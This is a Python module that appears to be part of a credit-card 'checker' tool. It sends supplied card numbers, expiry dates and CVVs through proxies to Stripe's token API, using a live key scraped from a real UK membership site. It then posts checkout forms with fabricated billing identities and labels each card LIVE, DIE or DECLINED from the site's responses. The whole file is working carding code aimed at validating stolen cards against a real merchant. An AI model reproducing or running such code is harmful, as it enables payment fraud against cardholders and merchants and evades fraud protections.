import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'MasterCard'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'AmericanExpress'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'Discover'
        
    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]
        


        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40
        
        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False
                
            },
            debug=True
            
        )
        

    #datext
        
        #cs.proxies.update(proxies)
        try:
            status = dict()
  



#'xx xxxx'


            url="https://diamonddjs.co.uk/membership-account/membership-checkout"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)




            url="https://api.stripe.com/v1/tokens"
            headers={

            "Accept":"application/json",
            "Accept-Language":"en-US",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://js.stripe.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://js.stripe.com/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-site",
            'TE':'trailers'
            }
            data='time_on_page=36547&pasted_fields=number%2Czip&guid=84b5ca18-0e15-4087-bd4a-2e7b842872422ece38&muid=84899cbd-7f0e-4862-be2a-796da528cf17acf281&sid=51a1b98a-25b8-4b23-b21b-af6bd8c04e2dfa12c7&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F78ef418&card[number]='+cc.ccnum+'&card[exp_month]='+cc.expm+'&card[exp_year]='+cc.expy+'&card[address_line1]='+self.billx.address+'&card[address_line2]=&card[address_city]='+self.billx.city+'&card[address_state]='+self.billx.estado2+'&card[address_zip]='+self.billx.zipcode+'&card[address_country]=US&card[cvc]='+cc.cv2+'&card[name]='+self.billx.nameFirs+'+'+self.billx.nameLast
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            idstri = datac.json()['id']

            passx = self.billx.nameFirs+str(randint(132,217837823))
            userxsa = self.billx.emailx

            url="https://diamonddjs.co.uk/membership-account/membership-checkout/"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://diamonddjs.co.uk/membership-account/membership-checkout/",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://diamonddjs.co.uk",
            "DNT":"1",
            "Connection":"keep-alive",

            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            data='level=1&checkjavascript=1&other_discount_code=&username='+userxsa+'&first_name='+self.billx.nameFirs+'&last_name='+self.billx.nameLast+'&dj_name='+userxsa+'&dj_city='+userxsa+'&password='+passx+'&password2='+passx+'&bemail='+self.billx.emailx+'%40gmail.com&bconfirmemail_copy=1&fullname=&bfirstname='+self.billx.nameFirs+'&blastname='+self.billx.nameLast+'&baddress1='+self.billx.address+'&baddress2=&bcity='+self.billx.city+'&bstate='+self.billx.estado2+'&bzipcode='+self.billx.zipcode+'&bcountry=US&bphone=%28604%29+784-1245&CardType='+self.cardIDx2+'&discount_code=&tos=1&submit-checkout=1&javascriptok=1&stripeToken0='+idstri+'&AccountNumber=XXXXXXXXXXXX'+cc2+'&ExpirationMonth='+cc.expm+'&ExpirationYear='+cc.expy
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)

 
            if 'incorrect_zip' in datac.text or 'Your card zip code is incorrect.' in datac.text or 'The zip code you supplied failed validation' in datac.text or 'card zip code is incorrect' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: CVV LIVE [ZIP INCORRECT]""",'proxy':dataGate.proxy,'datext':None}

            elif  'Thank You For Your Payment.' in datac.text or 'thank_you' in datac.text:#or 'donation_number=' in res.text
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: LIVE """,'proxy':dataGate.proxy,'datext':None}
            elif "card has insufficient funds" in datac.text or 'insufficient_funds' in datac.text or 'Insufficient Funds' in datac.text :
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: LIVE [LOW BALANCE]""",'proxy':dataGate.proxy,'datext':None}
            # elif "card's security code is incorrect" in datac.text or "card&#039;s security code is incorrect" in datac.text or "security code is invalid" in datac.text or 'CVC was incorrect' in datac.text or "incorrect CVC" in datac.text or 'cvc was incorrect' in datac.text or 'Card Issuer Declined CVV' in datac.text :
            #     text = f"""{dataGate.cc} |- RESULT: APPROVED [CVC MISMATCH]"""
            #     status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED [CVC MISMATCH]""",'proxy':dataGate.proxy,'datext':None}
            elif "card does not support this type of purchase" in datac.text or 'transaction_not_allowed' in datac.text or 'Transaction Not Allowed' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE [PURCHASE NOT ALLOWED]""",   'proxy':dataGate.proxy,'datext':None}

            elif "card number is incorrect" in datac.text or 'incorrect_number' in datac.text or 'Invalid Credit Card Number' in datac.text or 'card number is incorrect' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED [CARD INCORRECT]""",   'proxy':dataGate.proxy,'datext':None}
            elif "Error creating plan with Stripe" in datac.text or "Error creating plan with Stripe:" in datac.text or "Error creating customer record with Stripe: " in datac.text or "hooks.stripe.com/redirect/" in datac.text or 'requires an authorization' in datac.text:
                text = f"""{dataGate.cc} |- RESULT: DECLINED"""
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE """,   'proxy':dataGate.proxy,'datext':None}
            elif "card was declined" in datac.text or 'card_declined' in datac.text or 'The transaction has been declined' in datac.text or 'Processor Declined' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DECLINED """,   'proxy':dataGate.proxy,'datext':None}

            elif 'Do Not Honor' in datac.text :
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE """,   'proxy':dataGate.proxy,'datext':None}
            elif "card has expired" in datac.text or 'Expired Card' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DECLINED [CARD EXPIRED]""",   'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':None}



                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
